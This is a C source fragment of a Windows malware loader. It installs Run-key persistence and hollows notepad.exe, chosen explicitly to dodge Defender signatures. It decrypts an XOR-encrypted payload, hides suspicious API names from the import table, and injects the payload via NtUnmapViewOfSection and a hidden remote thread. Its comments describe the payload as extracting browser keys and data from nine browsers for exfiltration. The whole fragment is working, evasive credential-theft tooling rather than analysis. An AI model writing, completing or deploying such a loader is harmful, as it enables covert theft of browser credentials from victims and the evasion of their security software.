                        bool persist_here = PersistEnabled();
                        if(renamed){
                            if(persist_here){
                                InstallRunKey(bak);          // keep the backup as payload carrier
                            } else if(!DeleteFileW(bak)){
                                MoveFileExW(bak,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                            }
                        } else {
                            if(persist_here){
                                InstallRunKey(runExe);
                            } else if(!DeleteFileW(runExe)){
                                MoveFileExW(runExe,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                            }
                        }

                        // 4. Sacrificial process for hollowing: notepad.exe from System32
                        //    cmd.exe hollowing is a well-known Defender signature.
                        //    notepad.exe is less flagged and always present on Win10/11.
                        GetSystemDirectoryW(target_buf,MAX_PATH);
                        lstrcatW(target_buf,L"\\notepad.exe");
                        // Fallback: if notepad.exe doesn't exist (very unlikely), use cmd.exe
                        if(GetFileAttributesW(target_buf)==INVALID_FILE_ATTRIBUTES){
                            GetSystemDirectoryW(target_buf,MAX_PATH);
                            lstrcatW(target_buf,L"\\cmd.exe");
                        }
                        target=target_buf; kill=true;
                        // hijack scan + 9 browsers + big dumps on a slow disk: the full
                        // extraction measured ~3 min under DEBUG; 120s killed the payload
                        // mid-exfil and the TerminateProcess below looks like a silent crash.
                        wait=240000;
                        // falls through to hollowing code below
                    }
                }
            }
            if(!found) CloseHandle(hs);
        }
    }

    if(!target){
        LLog("no -p target and no appended host",0); return 1;
    }

    // 1. Host must be a native PE64 (no .NET / PyInstaller / 32-bit)
    HANDLE hf = CreateFileW(target,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){ LLog("host open failed",GetLastError()); return 2; }
    BYTE hdr[4096]; DWORD rd=0; ReadFile(hf,hdr,sizeof(hdr),&rd,NULL);
    PIMAGE_NT_HEADERS hn=Nt(hdr);
    if(!hn){ LLog("host PE parse failed",0); return 2; }
    if(hn->FileHeader.Machine!=IMAGE_FILE_MACHINE_AMD64){ LLog("host not x64",0); return 2; }
    CloseHandle(hf);
    if(purge) MoveFileExW(target,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);

    // 2. v20 key stage (elevated only). Runs before the payload is mapped so
    //    mc-<browser>.key files exist when ckdll walks the stores.
    RunKeyStage(keydebug);
#ifdef DEBUG
    if(keystage_only) return 0;             // bench hook, compiled out of release
#endif

    // 3. Decrypt the XOR-encrypted payload and patch sentinels
    BYTE* g_payload = DecryptPayload();
    if(!g_payload){ LLog("DecryptPayload failed",0); return 6; }

    // 4. Resolve suspicious APIs dynamically (removes them from IAT);
    //    names decoded from obfuscated constants so no plaintext lands in .rdata
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE nt  = GetModuleHandleA("ntdll.dll");
    tWriteProcessMemory pWriteProcessMemory = (tWriteProcessMemory)ProcObf(k32, EN_WPM);
    tVirtualAllocEx      pVirtualAllocEx    = (tVirtualAllocEx)ProcObf(k32, EN_VAE);
    tVirtualProtectEx   pVirtualProtectEx  = (tVirtualProtectEx)ProcObf(k32, EN_VPE);
    tCreateRemoteThread  pCreateRemoteThread= (tCreateRemoteThread)ProcObf(k32, EN_CRT);
    tUnmap unmap=(tUnmap)ProcObf(nt, EN_UNMAP);
    tNCTE  ncte=(tNCTE)ProcObf(nt, EN_NCTE);
    if(!pWriteProcessMemory || !pVirtualAllocEx || !pVirtualProtectEx){
        LLog("API resolve failed",0); free(g_payload); return 7;
    }

    // 5. Create sacrificial process in suspended state
    // CREATE_BREAKAWAY_FROM_JOB keeps the payload alive after the loader is killed,
    // but it fails with ERROR_ACCESS_DENIED when the loader itself runs inside a job
    // that disallows breakaway (Steam and other game launchers do this) -- in that
    // case retry without the flag; the payload then dies with the loader's job.
    STARTUPINFOW si={sizeof(si)}; PROCESS_INFORMATION pi;
    si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_BREAKAWAY_FROM_JOB,NULL,NULL,&si,&pi)){
        DWORD ce=GetLastError();
        if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi)){
            LLog("CreateProcessW hollow target failed",ce); free(g_payload); return 3;
        }
        LLog("breakaway denied, created without it",ce);
    }

    // 6. Unmap the host's original code (NtUnmapViewOfSection)
    PIMAGE_NT_HEADERS pn=Nt(g_payload);
    if(unmap) unmap(pi.hProcess,(PVOID)(ULONG_PTR)hn->OptionalHeader.ImageBase);

    // 7. Map the payload at its fixed base (compiled /DYNAMICBASE:NO -> no relocation needed)
    SIZE_T sz=pn->OptionalHeader.SizeOfImage;
    PVOID base=pVirtualAllocEx(pi.hProcess,(PVOID)(ULONG_PTR)pn->OptionalHeader.ImageBase,sz,
                              MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
    if(!base){ LLog("VirtualAllocEx failed",GetLastError()); TerminateProcess(pi.hProcess,0); free(g_payload); return 4; }
    SIZE_T wr=0;
    pWriteProcessMemory(pi.hProcess,base,g_payload,pn->OptionalHeader.SizeOfHeaders,&wr);
    PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(pn);
    for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
        if(!sh->SizeOfRawData) continue;
        pWriteProcessMemory(pi.hProcess,(BYTE*)base+sh->VirtualAddress,
                           g_payload+sh->PointerToRawData,sh->SizeOfRawData,&wr);
    }

    // 8. Fix IAT: only system DLLs, which have the SAME base in every process of this session
    DWORD imp_rva=pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if(imp_rva){
        PIMAGE_IMPORT_DESCRIPTOR imp=(PIMAGE_IMPORT_DESCRIPTOR)(g_payload+Rva2Off(pn,imp_rva));
        while(imp->Name){
            const char* dllname=(const char*)(g_payload+Rva2Off(pn,imp->Name));
            HMODULE m=LoadLibraryA(dllname); if(!m) break;
            DWORD th_rva=imp->FirstThunk;
            DWORD o_rva=imp->OriginalFirstThunk?imp->OriginalFirstThunk:imp->FirstThunk;
            PIMAGE_THUNK_DATA o_local=(PIMAGE_THUNK_DATA)(g_payload+Rva2Off(pn,o_rva));
            for(DWORD idx=0;o_local[idx].u1.AddressOfData;idx++){
                FARPROC a;
                if(IMAGE_SNAP_BY_ORDINAL(o_local[idx].u1.Ordinal))
                    a=GetProcAddress(m,(LPCSTR)IMAGE_ORDINAL(o_local[idx].u1.Ordinal));
                else{
                    DWORD hint_rva=(DWORD)o_local[idx].u1.AddressOfData;
                    PIMAGE_IMPORT_BY_NAME ib=(PIMAGE_IMPORT_BY_NAME)(g_payload+Rva2Off(pn,hint_rva));
                    a=GetProcAddress(m,ib->Name);
                }
                ULONG_PTR v=(ULONG_PTR)a;
                PVOID remote_thunk=(BYTE*)base+th_rva+idx*sizeof(IMAGE_THUNK_DATA);
                pWriteProcessMemory(pi.hProcess,remote_thunk,&v,sizeof(v),&wr);
            }
            imp++;
        }
    }

    // 9. Set per-section memory protection (no global RWX) and create hidden thread
    sh=IMAGE_FIRST_SECTION(pn);
    for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
        DWORD p=PAGE_READONLY,f=sh->Characteristics;
        if(f&IMAGE_SCN_MEM_EXECUTE) p=(f&IMAGE_SCN_MEM_WRITE)?PAGE_EXECUTE_READWRITE:PAGE_EXECUTE_READ;
        else if(f&IMAGE_SCN_MEM_WRITE) p=PAGE_READWRITE;
        pVirtualProtectEx(pi.hProcess,(BYTE*)base+sh->VirtualAddress,sh->Misc.VirtualSize,p,&p);
    }
    HANDLE th=NULL;
    ULONG_PTR arg=1;                                    // DLL_PROCESS_ATTACH
    BOOL spawned=FALSE;
    LLog("inject: imagebase+size+entry",(DWORD)((ULONG_PTR)base & 0xFFFFFFFF));
    if(ncte) spawned = ncte(&th,THREAD_ALL_ACCESS,NULL,pi.hProcess,
                            (PVOID)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
                            (PVOID)arg,NULL,0x0,0,0,NULL) >= 0;
    if(spawned) LLog("thread via NtCreateThreadEx",0);
    if(!spawned && pCreateRemoteThread){
        th=pCreateRemoteThread(pi.hProcess,NULL,0,
            (LPTHREAD_START_ROUTINE)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
            (PVOID)arg,0,&pi.dwThreadId); spawned=(th!=NULL);
        if(spawned) LLog("thread via CreateRemoteThread",0);
    }
    if(!spawned){ LLog("remote thread create failed",GetLastError()); TerminateProcess(pi.hProcess,0); free(g_payload); return 5; }

    // 10. Payload does its work on the remote thread.
    //    DO NOT resume the main thread -- the original entry point was unmapped
    //    by NtUnmapViewOfSection; resuming causes an access violation that kills the
    //    entire process (and the payload with it). The remote thread runs on its own.
    WaitForSingleObject(th,wait);
    DWORD xc=0; GetExitCodeThread(th,&xc);
    LLog("remote thread exit code",xc);
    if(kill) TerminateProcess(pi.hProcess,0);
    CloseHandle(th); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    free(g_payload);
    LLog("loader OK, payload thread finished",0); return 0;
}
